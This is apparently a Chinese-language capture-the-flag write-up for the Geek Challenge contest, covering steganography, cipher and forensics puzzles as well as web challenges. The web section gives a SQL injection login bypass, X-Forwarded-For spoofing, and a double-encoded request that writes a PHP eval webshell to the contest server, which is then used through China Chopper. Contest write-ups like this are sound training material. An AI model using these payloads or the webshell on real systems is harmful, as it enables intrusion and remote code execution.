极客大挑战 write up

misc

闪得好快

链接打开是一个下载的链接，下载解压之后是一个gif图，把gif图给分解掉，分成一帧一帧的，用手机扫下二维码就出来答案啦。

come_game

是一个小游戏，在打开游戏之后会出现deathtime，save2这两个文件，玩了几关之后会发现小人死了几次，deathtime中的二进制数据就会有所改变。并且改变save2中第02位的数据，将32改成33时，游戏进入下一关，改成35时flag就出来了。

snow

snow这道题提示是HTML隐写，搜了一下是一种叫snow的隐写术，找到了一个解密的网站http://fog.misty.com/perry/ccs/snow/snow/snow.html，把网址和key输进去，flag就出来了。

旋转跳跃

下载下来是一个MP3文件，MP3文件也是可以隐藏文件的，用MP3stego将文件导出来就行了。
这个工具一定要放在桌面上才能正常运行。使用方式如下：http://blog.csdn.net/myloveprogrmming/article/details/52641916

凯撒部长的奖励

是一长串凯撒密码，解密之后就能得到答案。
贴一个解密的网站：http://heartsnote.com/tools/cipher.htm

MD5cracker

直接解密有错误，数了一下的确是32位，试了很多方法，把 l 改成 1 就能得出flag。

PEN_AND_APPLE

提示是Windows下的type命令，Windows下的type命令可以显示文件内容。

利用NTFS流文件隐藏

首先用记事本新建两个文本文档,分别名为“1.txt”“2.txt”,其内容为“正常文件、数据流文件”,打开CMD命令行窗口, 进入两个文件所在文件夹,输入 type 2.txt>1.txt: shujuliu.txt,回车.即可将文件2.txt的内容加入1.txt, 内容以数据流方式保存,该数据流名为shujuliu.txt.在资源管理器中查看宿主文件1.txt,发现文件的修改日期和文件大小 都无变化,现在删除2.txt,执行命令:notepad 1.txt:shujuliu.txt ,即可查看数据流文件中的文件内容了.

用alternatestreamview可以提取出其中的文件，得到flag

藏着小秘密的流量包

下载下来的是一个pcapng文件，先试着用wireshark打开了….好吧我看不懂里面都有些什么…旁边的同学实在看不下去了让我放到虚拟机中试试。放到虚拟机里用binwalk将文件提取出来。

ls 查看文件夹包含的文件
foremost 使用foremost工具将文件分离出来

web

web_1

直接用burpsuite抓包一跑flag就出来了。

web_2

用burpsuite抓包之后，有一个whoami，试着改成admin了但是不行，一直提示you are not admin ，后来问过才知道那个guest%40geekgame是个邮箱，把前面的guest改成admin就行了。还有root也要改成1。

sqli2

网站打开后是一个登录界面，就知道是一个post注入，尝试着注入但是login failed，用sleep函数试了试发现是’闭合的…但其实没这必要，将debug改成1之后就会有信息出来。
用username=admin’ or ‘1’=’1 就可以得到flag。在这里注释符被过滤了。
但是username用123或者其他字符都不行，只能用admin。

127.0.0.x

这道题与x-forwarded-for头有关。

X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。

在火狐浏览器里安装x-forwarded-for head插件，将IP address改成127.0.0.51
题目中的滴滴滴滴的数量就是x的值，多刷新几次会发现滴滴滴滴的数量在变化，试了试51-55之间的数字都可以，只要和页面上滴滴的数量相同就可以了。

php_is_fun()

<?php
if(isset($_GET) && !empty($_GET)){
$url = $_GET[‘file’];
$path = “upload/“.$_GET[‘path’];
}else{
show_source(FILE);
exit();
}

if(strpos($path,’..’) > -1){
die(‘SYCwaf!’);
}

if(strpos($url,’http://127.0.0.1/‘) === 0){
file_put_contents($path, file_get_contents($url));
echo “console.log($path update successed!)”;
}else{
echo “Hello.Geeker”;
}

中间if(strpos($path,’..’) > -1)是为了防止path中存在..，也就是为了防止跨文件上传。
file_put_contents() 函数把一个字符串写入文件中。
file_get_contents() 把整个文件读入一个字符串中。
从$url中获取的内容写入到$path中
然后用一句话木马

http://game.sycsec.com:50084/?file=http://127.0.0.1/?file=http://127.0.0.1/&path=<?php eval($_post[‘123’])?>&path=1.php

path这一串需要用url编码，但由于在用get获得参数的时候，本身就会进行一次解码，那么我们的url参数就需要两次编码，但其实有问题的地方就只有空格那里，所以就将%20的%进行一次再编码就行了。

编码之后是这个样子的：
http://game.sycsec.com:50084/?file=http://127.0.0.1/?file=http://127.0.0.1/%26path%3D%3C%3Fphp%2520eval%28%24_post%5B%27123%27%5D%29%3F%3E&path=1.php

之后再用菜刀连接就可以得到flag。
